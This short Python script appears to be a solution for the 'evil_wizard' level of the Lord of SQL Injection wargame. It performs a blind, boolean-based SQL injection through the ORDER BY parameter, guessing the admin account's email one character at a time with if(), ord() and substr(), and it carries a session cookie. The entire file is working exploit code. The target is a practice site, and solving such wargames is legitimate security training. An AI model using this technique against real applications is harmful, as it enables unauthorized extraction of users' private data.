import requests

email = ""

for order in range(0,30):
    for p in range(46, 123):
        url="https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order=if(id='admin' and ord(substr(email,"+str(order+1)+", 1))="+str(p)+",score,20000)"
        cookies={'PHPSESSID':'5sfp0t0s6s8fh4ve7d0i63u711'}
        res = requests.get(url,cookies= cookies)
        if res.text.find("50</td></tr><tr><td>rubiya")!= -1:
            email = email +chr(p)
            print(email)
            break
print(email)
